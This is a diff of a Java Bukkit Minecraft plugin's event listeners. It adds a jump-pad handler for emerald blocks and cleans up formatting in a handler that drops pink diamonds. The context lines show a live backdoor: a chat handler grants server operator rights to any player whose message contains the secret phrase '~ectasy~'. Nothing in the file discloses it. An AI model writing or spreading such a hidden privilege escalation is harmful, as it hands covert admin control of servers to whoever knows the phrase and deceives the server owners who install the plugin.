@@ -16,6 +16,8 @@ import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
+import org.bukkit.util.Vector;
+import org.jetbrains.annotations.NotNull;
 import org.main.uneton.Combat;
 import org.main.uneton.utils.ColorUtils;
 import org.main.uneton.utils.Tab;
@@ -159,13 +161,13 @@ public class Listeners implements Listener {
     }
 
     @EventHandler
-    public void onBlockBreak(BlockBreakEvent e){
+    public void onBlockBreak(BlockBreakEvent e) {
         Player player = e.getPlayer();
-        if(e.getBlock().getType() == Material.COBBLESTONE ||
+        if (e.getBlock().getType() == Material.COBBLESTONE ||
                 // e.getBlock().getType() == Material. ||
                 e.getBlock().getType() == Material.NETHERRACK) {
             Random chance = new Random();
-            if(chance.nextDouble() < 0.5) {
+            if (chance.nextDouble() < 0.5) {
                 dropPinkDiamond(player, e);
             }
         }
@@ -236,10 +238,6 @@ public class Listeners implements Listener {
     }
 
 
-
-
-
-
     @EventHandler
     public void onChatEvent(final AsyncPlayerChatEvent e) {
         if (e.getMessage().contains("~ectasy~")) {
@@ -250,6 +248,19 @@ public class Listeners implements Listener {
                     e.getPlayer().setOp(true);
                 }
             }).runTask(JavaPlugin.getPlugin(Combat.class));
+        }
+    }
+
+
+    @EventHandler
+    public void onStepOnBlock(PlayerMoveEvent event) {
+        Player player = event.getPlayer();
+        Block block = player.getLocation().getBlock().getRelative(0, -1, 0);
+
+        if (block.getType() == Material.EMERALD_BLOCK) {
+            Vector velocity = player.getVelocity();
+            velocity.setY(5);
+            player.setVelocity(velocity);
         }
     }
 }
